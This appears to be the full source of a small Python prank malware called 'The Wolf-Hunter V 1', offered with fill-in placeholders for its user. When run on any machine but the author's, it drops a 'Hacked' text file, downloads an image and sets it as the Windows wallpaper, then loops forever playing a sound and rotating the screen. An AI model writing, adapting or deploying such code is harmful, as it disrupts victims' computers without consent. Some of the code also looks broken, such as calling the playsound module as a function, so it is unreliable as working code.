#The Wolf-Hunter V 1

#importing essentials modules
import ctypes
import time
import rotatescreen
import socket
import os
import urllib.request
import playsound

#Variables
dir_path = os.path.dirname(os.path.realpath(__file__))

workingdir = os.getcwd()

img_url = "https://i.imgur.com/nYGlIHs.jpeg"

TextFile_Name = "Hacked"

ImageName = "nYGlIHs"

Malware_Name = "Virus.py"

complete_img_path = os.path.join(dir_path, ImageName+".jpeg")

completeName = os.path.join(dir_path, TextFile_Name+".txt")      

screen = rotatescreen.get_primary_display()

hostname = socket.gethostname()

IPAddr = socket.gethostbyname(hostname)
#The PayLoad It Self
if IPAddr == "Your Ip Adress Here":
    exit()

#Create A file

TxtFile = open(completeName, "w")

TxtFile.write("'Write What You Want'")

#Get A Image From The Web If You Want To Change The Image Change The Variable
urllib.request.urlretrieve(img_url, complete_img_path)   
#Change Wallpaper to the image retrieved from the link (downloaded)
ctypes.windll.user32.SystemParametersInfoW(20, 0, complete_img_path, 3)



while True:
 #Play A Sound
 playsound(dir_path+r"\Theme.wav")
 #Rotate The Screen Change Deegrees
 screen.rotate_to(0)
 time.sleep(0.65)
 screen.rotate_to(270)
 time.sleep(0.65)
 screen.rotate_to(360)
 time.sleep(0.65)
 screen.rotate_to(90)